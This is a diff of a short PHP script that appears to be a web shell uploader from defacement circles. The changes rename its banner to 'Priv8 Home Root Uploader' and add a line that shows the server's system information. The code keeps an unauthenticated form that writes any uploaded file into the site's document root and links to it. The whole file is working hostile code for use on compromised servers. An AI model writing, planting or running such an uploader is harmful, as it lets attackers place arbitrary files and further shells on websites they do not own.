@@ -1,5 +1,6 @@
 <?php
-echo "<center><h1>xXxMonkeyxXx</h1>";
+echo "Priv8 Home Root Uploader<br>";
+echo "<b>".php_uname()."</b><br>";
 echo "<form method='post' enctype='multipart/form-data'>
       <input type='file' name='idx_file'>
       <input type='submit' name='upload' value='upload'>
@@ -11,7 +12,7 @@ if(isset($_POST['upload'])) {
     if(is_writable($root)) {
         if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
             $web = "http://".$_SERVER['HTTP_HOST']."/";
-            echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
+            echo "Sukses in root document!!!!! -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
         } else {
             echo "gagal upload di document root.";
         }
